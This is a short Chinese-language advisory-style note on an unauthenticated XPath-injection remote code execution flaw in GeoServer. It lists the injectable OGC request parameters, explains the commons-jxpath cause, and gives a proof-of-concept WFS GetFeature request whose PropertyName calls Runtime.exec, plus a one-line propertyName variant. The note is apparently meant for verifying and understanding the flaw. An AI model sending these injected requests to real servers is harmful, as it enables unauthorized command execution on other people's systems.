验证漏洞存在方法
    - 通过发送WFS GetFeature请求，在propertyName参数中注入XPath表达式
    - 通过发送WMS GetMap请求，在LAYERS参数中注入XPath表达式
    - 通过发送WFS GetPropertyValue请求，在valueReference参数中注入XPath表达式
    - 通过发送WMS GetFeatureInfo请求，在QUERY_LAYERS参数中注入XPath表达式
    - 通过发送WMS GetLegendGraphic请求，在LAYER参数中注入XPath表达式
    - 通过发送WPS Execute请求，在输入参数中注入XPath表达式

漏洞利用方法
    - 该漏洞存在于GeoServer的GeoTools库中，当处理OGC请求时，会将属性名作为XPath表达式传递给commons-jxpath库进行求值
    - 由于commons-jxpath库在求值XPath表达式时能够执行任意代码，攻击者可以通过精心构造的XPath表达式实现远程代码执行
    - 漏洞影响所有默认安装的GeoServer实例，因为XPath求值本应仅用于复杂要素类型，但错误地应用于简单要素类型
    - 攻击者无需身份验证即可利用此漏洞
    
    - PoC示例（概念验证）：
      ```
      # WFS GetFeature请求示例
      POST /geoserver/wfs HTTP/1.1
      Host: target.com
      Content-Type: text/xml
      
      <?xml version="1.0"?>
      <wfs:GetFeature service="WFS" version="1.1.0"
        xmlns:wfs="http://www.opengis.net/wfs"
        xmlns:ogc="http://www.opengis.net/ogc"
        xmlns:gml="http://www.opengis.net/gml">
        <wfs:Query typeName="topp:states">
          <ogc:Filter>
            <ogc:PropertyIsEqualTo>
              <ogc:PropertyName>java.lang.Runtime.getRuntime().exec('calc.exe')</ogc:PropertyName>
              <ogc:Literal>true</ogc:Literal>
            </ogc:PropertyIsEqualTo>
          </ogc:Filter>
        </wfs:Query>
      </wfs:GetFeature>
      
      # 或者使用更直接的XPath注入：
      # propertyName=java.lang.Runtime.getRuntime().exec('id')
      ```
      
      **注意**：实际利用需要构造特定的XPath表达式来调用Java反射API执行系统命令。由于安全原因，这里不提供可直接执行的完整利用代码。
